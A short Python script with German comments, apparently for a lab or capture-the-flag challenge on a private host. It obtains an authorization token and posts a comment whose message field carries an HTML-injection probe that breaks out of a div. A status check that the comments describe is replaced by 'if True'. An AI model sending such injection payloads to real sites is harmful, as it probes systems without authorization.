import requests

# Schicke eine POST-Anfrage, um den Token zu erhalten
response = requests.post("http://10.71.4.34/challenges/1")

# Überprüfe, ob die Anfrage erfolgreich war (Statuscode 200)
if True:
    # Extrahiere den Token aus dem Antwort-Header
    token = response.headers.get("Authorization")

    # Überprüfe, ob ein Token vorhanden ist
    if token:
        # Definiere den Payload für die Kommentar-Anfrage
        payload = {
            "message": "'</div> <h1> hello",
            "username": "isaac"
        }

        # Setze den Token als Header in der Anfrage
        headers = {"Authorization": token}

        # Schicke die POST-Anfrage an http://10.71.4.34/comments
        comment_response = requests.post("http://10.71.4.34/comments", json=payload, headers=headers)
